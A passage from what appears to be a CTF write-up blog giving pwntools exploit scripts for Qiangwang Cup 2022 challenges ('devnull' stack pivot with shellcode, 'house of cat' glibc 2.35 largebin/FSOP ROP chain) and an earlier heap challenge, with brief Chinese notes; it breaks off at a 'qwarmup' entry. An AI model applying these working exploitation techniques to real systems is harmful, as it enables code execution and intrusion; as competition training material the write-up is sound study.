class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;39.105.185.193&#x27;</span>, <span class="hljs-number">30007</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">index, phone, name</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&#x27;Number: &#x27;</span>, phone)<br>p.sendlineafter(<span class="hljs-string">&#x27;(y/n): &#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_vuln</span>(<span class="hljs-params">index, phone, idx, val, name</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&#x27;Number: &#x27;</span>, phone)<br>p.sendlineafter(<span class="hljs-string">&#x27;(y/n): &#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;wrong?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>p.sendline(val)<br>p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-comment"># gdb.attach(p)#, &#x27;b *$rebase(0xE2B)&#x27;)</span><br><br><br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;2&#x27;</span>*<span class="hljs-number">0x418</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add_vuln(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) -<span class="hljs-number">2</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>one_gadget = [<span class="hljs-number">0x4f2a5</span>, <span class="hljs-number">0x4f302</span>, <span class="hljs-number">0x10a2fc</span>]<br>one_gadget = libc_base + one_gadget[<span class="hljs-number">1</span>]<br>add(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(<span class="hljs-number">3</span>+i, <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x120</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>free(<span class="hljs-number">3</span>+i)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add_vuln(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x20</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>) <span class="hljs-comment"># overlap 0x21</span><br>free(<span class="hljs-number">10</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x50</span> + p64(free_hook))<span class="hljs-comment"># overlap 0x21</span><br>add(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;1&#x27;</span>, p64(one_gadget))<br><br>free(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="强网杯-2022"><a href="#强网杯-2022" class="headerlink" title="强网杯 2022"></a>强网杯 2022</h1><p><del>pwn网杯劝退pwn手</del></p><h2 id="devnull"><a href="#devnull" class="headerlink" title="devnull"></a>devnull</h2><p>栈溢出改fd，然后栈迁移调用mprotect把栈改为可执行，然后写shellcode，最后拿到shell的时候重定向一下输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>binary = <span class="hljs-string">&#x27;./devnull&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>    p = process(binary)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;182.92.223.176&#x27;</span>, <span class="hljs-number">37269</span>)<br>    <span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>elf = ELF(binary)<br>    <br><span class="hljs-comment"># gdb.attach(p, &#x27;b *0x40145E&#x27;)   </span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> *<span class="hljs-number">0x20</span> + p8(<span class="hljs-number">0</span>) <br>p.sendafter(<span class="hljs-string">&#x27;filename\n&#x27;</span>, payload)<br><span class="hljs-comment"># sleep(1)</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x13</span>+ p64(<span class="hljs-number">0x3FF000</span>)<br>payload = payload.ljust(<span class="hljs-number">0x23</span>-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x3FF000</span>+<span class="hljs-number">0x18</span>) + p64(<span class="hljs-number">0x401350</span>)<br>p.sendafter(<span class="hljs-string">&#x27;discard\n&#x27;</span>, payload)<br><span class="hljs-comment"># sleep(1)</span><br>payload = p64(<span class="hljs-number">0x3FF000</span>)<br>payload = payload.ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x4012D0</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(<span class="hljs-number">0x3ff038</span>) + asm(shellcraft.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x3ff04d</span>, <span class="hljs-number">0x100</span>))<br><span class="hljs-comment"># payload =</span><br>p.sendafter(<span class="hljs-string">&#x27;data\n&#x27;</span>, payload)<br><br>pause()<br><br>payload = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/dev/pts/1&#x27;</span>, <span class="hljs-number">2</span>))<br>orw = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-number">2</span>)<br>orw += shellcraft.read(<span class="hljs-number">4</span>, <span class="hljs-number">0x3FF200</span>, <span class="hljs-number">0x30</span>)<br>orw += shellcraft.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x3FF200</span>, <span class="hljs-number">0x30</span>)<br><span class="hljs-comment"># orw = asm(shellcraft.sh())</span><br>p.send(payload + asm(orw))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>第二次做2.35的题，程序没有exit和自然退出，故banana调用链无法触发，使用house of emma调用链，0x418、0x428、0x438、0x448两条链刚好两次largebin attack，改stderr和pointer_guard，最后堆风水+UAF改小top chunk触发malloc_assert调用链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./house_of_cat&#x27;</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;39.107.237.149&#x27;</span>, <span class="hljs-number">15255</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">index, size, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;~\n&#x27;</span>, <span class="hljs-string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&#x27;size:\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendafter(<span class="hljs-string">&#x27;content:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;~\n&#x27;</span>, <span class="hljs-string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:\n&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;content:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;~\n&#x27;</span>, <span class="hljs-string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;~\n&#x27;</span>, <span class="hljs-string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-comment"># gdb.attach(p)#, &#x27;b *$rebase(0x181b)&#x27;)</span><br><br>payload = <span class="hljs-string">&#x27;LOGIN | r00t QWBQWXF admin&#x27;</span><br>p.sendafter(<span class="hljs-string">&#x27;~\n&#x27;</span>, payload)<br><br><span class="hljs-comment"># payload = b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span><br><span class="hljs-comment"># p.sendlineafter(&#x27;~\n&#x27;, payload)</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x428</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x428</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br><span class="hljs-comment"># add(2, 0x438, &#x27;verf1sh&#x27;)</span><br><span class="hljs-comment"># add(3, 0x420, &#x27;verf1sh&#x27;)</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">15</span>, <span class="hljs-number">0x448</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">14</span>, <span class="hljs-number">0x448</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Context:\n&#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x21a0d0</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>p.recv(<span class="hljs-number">8</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment">#&amp; 0xfffffffff000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br><br>flag_path = heap_base + <span class="hljs-number">0x440</span><br>rtld_global = libc_base + <span class="hljs-number">0x278040</span><br>stderr = libc_base + libc.sym[<span class="hljs-string">&#x27;stderr&#x27;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>ret = libc_base + <span class="hljs-number">0x0000000000029cd6</span><br>bin_sh = libc_base + <span class="hljs-number">0x00000000001d8698</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>gadget = libc_base + <span class="hljs-number">0x00000000001675b0</span> <br>io_cookie_jumps_addr = libc_base + <span class="hljs-number">0x215b80</span><br>pointer_guard = libc_base - <span class="hljs-number">0x2890</span><br><br>fake_file = <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">0x78</span><br>fake_file += p64(libc_base+<span class="hljs-number">0x21ba60</span>)<br>fake_file = fake_file.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_file += p64(io_cookie_jumps_addr+<span class="hljs-number">0x18</span>)<br>fake_file += p64(heap_base + <span class="hljs-number">0x10e0</span> + <span class="hljs-number">0x450</span>)<br>fake_file += p64(<span class="hljs-number">0</span>)<br>enc_data =((gadget^(heap_base+<span class="hljs-number">0x1960</span>))&gt;&gt;(<span class="hljs-number">64</span>-<span class="hljs-number">0x11</span>))|((gadget^(heap_base+<span class="hljs-number">0x1960</span>))&lt;&lt;<span class="hljs-number">0x11</span>)<br>fake_file += p64(enc_data)<br><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x000000000011f497</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000045eb0</span><br>ret = libc_base + <span class="hljs-number">0x0000000000029cd6</span><br>Read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>Write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>close = libc_base + libc.sym[<span class="hljs-string">&#x27;close&#x27;</span>]<br>syscall = Read + <span class="hljs-number">0x10</span><br><br>orw = p64(<span class="hljs-number">0</span>) + p64(heap_base+<span class="hljs-number">0x10d0</span>+<span class="hljs-number">0x460</span>)<br>orw += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span><br>orw += p64(setcontext+<span class="hljs-number">61</span>)<br>orw += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x78</span><br>orw += p64(heap_base + <span class="hljs-number">0x10e0</span> + <span class="hljs-number">0x460</span>+<span class="hljs-number">0xa0</span>) + p64(ret)<br><br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>)<br>orw += p64(close)<br>orw += p64(pop_rdi_ret) + p64(flag_path)<br>orw += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br>orw += p64(syscall)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rsi_ret) + p64(flag_path)<br>orw += p64(pop_rdx_ret) + p64(<span class="hljs-number">0x41</span>)*<span class="hljs-number">2</span><br>orw += p64(Read)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">1</span>)<br>orw += p64(Write)<br><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x428</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x418</span>, fake_file)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x438</span>, orw)<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x438</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">2</span>, p64(libc_base+<span class="hljs-number">0x21a0d0</span>)*<span class="hljs-number">2</span> + p64(heap_base) + p64(stderr-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x458</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br><br>free(<span class="hljs-number">15</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>free(<span class="hljs-number">12</span>)<br>success(<span class="hljs-string">&#x27;pointer_guard-0x20 -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(pointer_guard-<span class="hljs-number">0x20</span>)))<br>edit(<span class="hljs-number">15</span>, p64(libc_base+<span class="hljs-number">0x21a0e0</span>)*<span class="hljs-number">2</span> + p64(heap_base+<span class="hljs-number">0x860</span>) + p64(pointer_guard-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br><br>free(<span class="hljs-number">9</span>)<br>free(<span class="hljs-number">10</span>)<br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x460</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x458</span> + p64(<span class="hljs-number">0x471</span>))<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x460</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x458</span> + p64(<span class="hljs-number">0x451</span>))<br><br><br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">9</span>)<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x460</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x100</span>))<br>success(<span class="hljs-string">&#x27;setcontext -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(setcontext+<span class="hljs-number">61</span>)))<br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">&#x27;~\n&#x27;</span>, <span class="hljs-string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;size:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x460</span>))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="qwarmup"><a href="#qwarmup" class="headerlink" title="qwarmup"></a>qwarmup</h2><p><del>比赛的时候没做出来，个人思路是爆破程序基址间的距离 也不知道实际可不可行</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span 